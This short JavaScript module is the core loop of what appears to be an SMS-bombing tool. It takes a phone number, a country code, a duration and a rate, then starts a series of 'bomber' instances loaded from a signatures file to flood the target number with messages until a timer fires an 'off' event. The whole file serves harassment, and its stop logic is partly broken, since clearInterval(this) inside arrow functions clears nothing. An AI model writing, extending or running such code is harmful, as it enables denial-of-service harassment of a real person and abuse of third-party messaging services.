const signatures = require('./signatures');

module.exports = async function (phone, minutes, countrySign, smsPerSecond){
    var stop = false;
    const bombers = signatures.map(Sign => Sign.country === countrySign ? new Sign(phone) : null).filter(instance => instance);

    var seconds = 0;
    setInterval(() => {
        if(stop == false){
            seconds += 10;
            if(minutes * 60 <= seconds) global.eventEmitter.emit('off', phone);
        } else clearInterval(this);
    }, 10000);

    var index = 0;
    setInterval(() => {
        if(stop == false && index < bombers.length) {
            bombers[index].start();
            index++;
        } else clearInterval(this);
    }, 1000/smsPerSecond);

    global.eventEmitter.on('off', (offPhone) => {
        if(offPhone) {
            stop = true;
            bombers.forEach((bomber) => bomber.stop());
        }
    });
}